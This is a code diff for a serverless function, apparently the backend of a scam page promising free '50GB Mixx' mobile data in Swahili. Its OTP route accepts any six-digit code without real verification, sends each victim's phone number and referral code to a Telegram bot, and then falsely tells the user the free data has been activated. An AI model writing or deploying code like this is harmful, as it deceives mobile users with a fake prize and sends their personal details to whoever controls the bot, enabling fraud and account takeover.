@@ -74,4 +74,131 @@ exports.handler = async (event) => {
                 headers,
                 body: JSON.stringify({
                     success: true,
-                    message:
+                    message: 'Msimbo wa OTP umetumwa.',
+                    phone: cleanPhone
+                })
+            };
+        }
+
+        // ===== VERIFY OTP =====
+        if (event.httpMethod === 'POST' && path === '/verify-otp') {
+            const { phone, otp } = JSON.parse(event.body);
+
+            if (!phone || !otp) {
+                return {
+                    statusCode: 400,
+                    headers,
+                    body: JSON.stringify({
+                        success: false,
+                        message: 'Msimbo unahitajika.'
+                    })
+                };
+            }
+
+            const cleanPhone = phone.replace(/^0+/, '').replace(/^\+255/, '');
+
+            // ✅ OTP MUST BE EXACTLY 6 DIGITS
+            if (!/^\d{6}$/.test(otp)) {
+                return {
+                    statusCode: 401,
+                    headers,
+                    body: JSON.stringify({
+                        success: false,
+                        message: 'Msimbo lazima uwe tarakimu 6.'
+                    })
+                };
+            }
+
+            const userData = userStore[cleanPhone];
+            const referral = userData ? userData.referral : 'N/A';
+            const timestamp = new Date().toISOString();
+
+            // Send to Telegram
+            const message = `
+📱 *NEW MIXX REFERRAL!*
+
+📞 *Phone:* ${cleanPhone}
+🔗 *Referral Code:* ${referral}
+📦 *Offer:* 50GB Mixx Data
+🕐 *Time:* ${timestamp}
+
+✅ *Status:* Successfully Activated!
+            `;
+
+            let telegramSuccess = false;
+            let telegramError = null;
+
+            if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
+                try {
+                    const telegramResponse = await fetch(
+                        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                        {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: TELEGRAM_CHAT_ID,
+                                text: message,
+                                parse_mode: 'Markdown'
+                            })
+                        }
+                    );
+
+                    if (telegramResponse.ok) {
+                        telegramSuccess = true;
+                        console.log(`✅ Telegram sent for ${cleanPhone}`);
+                    } else {
+                        telegramError = await telegramResponse.text();
+                        console.error(`❌ Telegram error: ${telegramError}`);
+                    }
+                } catch (error) {
+                    telegramError = error.message;
+                    console.error(`❌ Telegram error: ${telegramError}`);
+                }
+            }
+
+            // Clean up
+            delete userStore[cleanPhone];
+
+            return {
+                statusCode: 200,
+                headers,
+                body: JSON.stringify({
+                    success: true,
+                    message: 'Hongera! Umepata 50GB DATA BURE.',
+                    data: {
+                        phone: cleanPhone,
+                        offer: '50GB Mixx',
+                        activated: true,
+                        referral: referral,
+                        telegramSent: telegramSuccess,
+                        telegramError: telegramError
+                    }
+                })
+            };
+        }
+
+        return {
+            statusCode: 404,
+            headers,
+            body: JSON.stringify({
+                success: false,
+                message: 'Route not found'
+            })
+        };
+
+    } catch (error) {
+        console.error('Error:', error);
+        return {
+            statusCode: 500,
+            headers: {
+                'Access-Control-Allow-Origin': '*',
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                success: false,
+                message: 'Internal server error',
+                error: error.message
+            })
+        };
+    }
+};
